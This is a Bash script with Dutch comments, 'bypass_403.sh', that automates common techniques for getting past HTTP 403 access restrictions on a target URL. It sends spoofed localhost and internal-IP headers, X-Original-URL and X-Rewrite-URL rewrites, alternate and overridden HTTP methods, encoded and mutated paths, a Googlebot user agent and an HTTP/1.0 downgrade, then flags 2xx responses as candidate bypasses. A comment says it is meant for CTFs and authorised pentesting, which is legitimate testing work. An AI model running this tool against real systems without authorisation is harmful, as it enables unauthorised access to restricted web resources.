#!/usr/bin/env bash
#
# bypass_403.sh - Probeert veelvoorkomende HTTP 403-bypass technieken
#
# Gebruik:  bash bypass_403.sh <URL>
# Voorbeeld: bash bypass_403.sh https://target.tld/admin
#
# Vereist: curl
#
# Bedoeld voor CTF's / geautoriseerd pentesten. Gebruik alleen op
# systemen waarvoor je expliciete toestemming hebt.

set -uo pipefail

# ---------------------------------------------------------------------------
# Argument-afhandeling
# ---------------------------------------------------------------------------
if [[ $# -lt 1 ]]; then
    echo "Gebruik: bash $0 <URL>"
    echo "Voorbeeld: bash $0 https://target.tld/admin"
    exit 1
fi

RAW_URL="$1"

# curl-vlaggen: stil, geen output-body, alleen HTTP-code + grootte, timeout, volg geen redirects
# -k = negeer TLS-fouten (handig in CTF's). Verwijder desgewenst.
CURL_OPTS=(-s -k -o /dev/null -m 10 --max-redirs 0)

# ---------------------------------------------------------------------------
# URL ontleden in scheme://host en pad
# ---------------------------------------------------------------------------
# Verwijder trailing slash niet automatisch; we hebben zowel base als path nodig.
SCHEME_HOST="$(echo "$RAW_URL" | grep -oE '^https?://[^/]+')"
PATH_PART="${RAW_URL#$SCHEME_HOST}"
[[ -z "$PATH_PART" ]] && PATH_PART="/"
# Zorg dat het pad met een slash begint
[[ "$PATH_PART" != /* ]] && PATH_PART="/$PATH_PART"
# Strip een eventuele trailing slash voor de path-mutaties (aparte var)
CLEAN_PATH="${PATH_PART%/}"
[[ -z "$CLEAN_PATH" ]] && CLEAN_PATH="/"

# Kleuren
GREEN='\033[0;32m'; YELLOW='\033[0;33m'; RED='\033[0;31m'; CYAN='\033[0;36m'; NC='\033[0m'

echo -e "${CYAN}==========================================================${NC}"
echo -e "${CYAN} 403 Bypass tester${NC}"
echo -e "${CYAN} Doel-URL : ${NC}$RAW_URL"
echo -e "${CYAN} Base     : ${NC}$SCHEME_HOST"
echo -e "${CYAN} Pad      : ${NC}$PATH_PART"
echo -e "${CYAN}==========================================================${NC}"

# ---------------------------------------------------------------------------
# Hulpfunctie: voer een request uit en kleur de statuscode
# ---------------------------------------------------------------------------
# Argumenten: $1 = beschrijving, rest = extra curl-argumenten (URL moet er ook bij)
run() {
    local label="$1"; shift
    local code size
    # %{http_code} en %{size_download} in één curl-call
    read -r code size < <(curl "${CURL_OPTS[@]}" -w '%{http_code} %{size_download}' "$@")
    local color="$YELLOW"
    case "$code" in
        2*) color="$GREEN" ;;       # succes -> mogelijke bypass
        403|401) color="$RED" ;;    # nog steeds geblokkeerd
        3*) color="$CYAN" ;;        # redirect
        *) color="$YELLOW" ;;
    esac
    printf "  [${color}%s${NC}] %-8s %s\n" "$code" "(${size}b)" "$label"
}

# ---------------------------------------------------------------------------
# 1. Baseline
# ---------------------------------------------------------------------------
echo -e "\n${CYAN}[*] Baseline${NC}"
run "GET $PATH_PART" "$SCHEME_HOST$PATH_PART"

# ---------------------------------------------------------------------------
# 2. Bypass-headers (spoofed IP / host)
# ---------------------------------------------------------------------------
echo -e "\n${CYAN}[*] Header-injectie (spoofed IP / host)${NC}"

HEADERS=(
    "X-Forwarded-For: 127.0.0.1"
    "X-Forwarded-For: localhost"
    "X-Forwarded-For: 0.0.0.0"
    "X-Forwarded-For: 192.168.1.1"
    "X-Forwarded-For: 10.0.0.1"
    "X-Forwarded-Host: 127.0.0.1"
    "X-Forwarded-Host: localhost"
    "X-Forwarded-Server: 127.0.0.1"
    "X-Forwarded-Scheme: http"
    "X-Forwarded-Proto: http"
    "X-Forwarded-Port: 443"
    "X-Real-IP: 127.0.0.1"
    "X-Originating-IP: 127.0.0.1"
    "X-Remote-IP: 127.0.0.1"
    "X-Remote-Addr: 127.0.0.1"
    "X-Client-IP: 127.0.0.1"
    "X-Host: 127.0.0.1"
    "X-Host: localhost"
    "X-Custom-IP-Authorization: 127.0.0.1"
    "X-Original-URL: $PATH_PART"
    "X-Rewrite-URL: $PATH_PART"
    "X-Override-URL: $PATH_PART"
    "X-Originating-URL: $PATH_PART"
    "Forwarded: for=127.0.0.1;by=127.0.0.1"
    "Cluster-Client-IP: 127.0.0.1"
    "True-Client-IP: 127.0.0.1"
    "X-ProxyUser-Ip: 127.0.0.1"
    "Client-IP: 127.0.0.1"
    "Referer: $SCHEME_HOST$PATH_PART"
)

for h in "${HEADERS[@]}"; do
    run "$h" -H "$h" "$SCHEME_HOST$PATH_PART"
done

# Voor X-Original-URL / X-Rewrite-URL wordt het pad vaak op de root gezet:
echo -e "\n${CYAN}[*] X-Original-URL / X-Rewrite-URL naar root${NC}"
run "X-Original-URL: $PATH_PART (naar /)"  -H "X-Original-URL: $PATH_PART"  "$SCHEME_HOST/"
run "X-Rewrite-URL: $PATH_PART (naar /)"   -H "X-Rewrite-URL: $PATH_PART"   "$SCHEME_HOST/"

# ---------------------------------------------------------------------------
# 3. HTTP-methoden
# ---------------------------------------------------------------------------
echo -e "\n${CYAN}[*] Alternatieve HTTP-methoden${NC}"
for m in GET POST HEAD OPTIONS PUT DELETE PATCH TRACE CONNECT; do
    run "$m" -X "$m" "$SCHEME_HOST$PATH_PART"
done

# Method override via header
echo -e "\n${CYAN}[*] Method-override headers${NC}"
run "X-HTTP-Method-Override: GET"       -H "X-HTTP-Method-Override: GET"       -X POST "$SCHEME_HOST$PATH_PART"
run "X-HTTP-Method: GET"                -H "X-HTTP-Method: GET"                -X POST "$SCHEME_HOST$PATH_PART"
run "X-Method-Override: GET"            -H "X-Method-Override: GET"            -X POST "$SCHEME_HOST$PATH_PART"

# ---------------------------------------------------------------------------
# 4. Path-manipulatie
# ---------------------------------------------------------------------------
echo -e "\n${CYAN}[*] Path-manipulatie${NC}"

# We bouwen varianten op basis van CLEAN_PATH (zonder trailing slash)
PATHS=(
    "$CLEAN_PATH/"
    "$CLEAN_PATH//"
    "$CLEAN_PATH/."
    "$CLEAN_PATH/./"
    "/.$CLEAN_PATH"
    "$CLEAN_PATH%2e/"
    "$CLEAN_PATH%20"
    "$CLEAN_PATH%20/"
    "$CLEAN_PATH%09"
    "$CLEAN_PATH?"
    "$CLEAN_PATH??"
    "$CLEAN_PATH#"
    "$CLEAN_PATH/*"
    "$CLEAN_PATH.json"
    "$CLEAN_PATH.html"
    "$CLEAN_PATH..;/"
    "$CLEAN_PATH;/"
    "$CLEAN_PATH/~"
    "$CLEAN_PATH%2f/"
    "$CLEAN_PATH%2f%2f"
    "/%2e$CLEAN_PATH"
    "$CLEAN_PATH.."
    "$CLEAN_PATH/..;/"
    "/..%2f$CLEAN_PATH"
)

for p in "${PATHS[@]}"; do
    # dubbele leidende slash opschonen
    url="$SCHEME_HOST$(echo "$p" | sed 's#^//*#/#')"
    run "$p" "$url"
done

# Case-variatie (alleen zinvol als het pad letters bevat)
if [[ "$CLEAN_PATH" =~ [a-zA-Z] ]]; then
    echo -e "\n${CYAN}[*] Case-variatie${NC}"
    UPPER="$(echo "$CLEAN_PATH" | tr '[:lower:]' '[:upper:]')"
    run "UPPERCASE: $UPPER" "$SCHEME_HOST$UPPER"
fi

# ---------------------------------------------------------------------------
# 5. User-Agent / overige
# ---------------------------------------------------------------------------
echo -e "\n${CYAN}[*] User-Agent varianten${NC}"
run "UA: Googlebot"        -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "$SCHEME_HOST$PATH_PART"
run "UA: leeg"             -A "" "$SCHEME_HOST$PATH_PART"

# HTTP/1.0 downgrade
echo -e "\n${CYAN}[*] Protocol-downgrade${NC}"
run "HTTP/1.0" --http1.0 "$SCHEME_HOST$PATH_PART"

echo -e "\n${CYAN}==========================================================${NC}"
echo -e "${GREEN}Klaar.${NC} Let op ${GREEN}2xx${NC}-codes of afwijkende response-groottes: dat zijn kandidaat-bypasses."
echo -e "${CYAN}==========================================================${NC}"
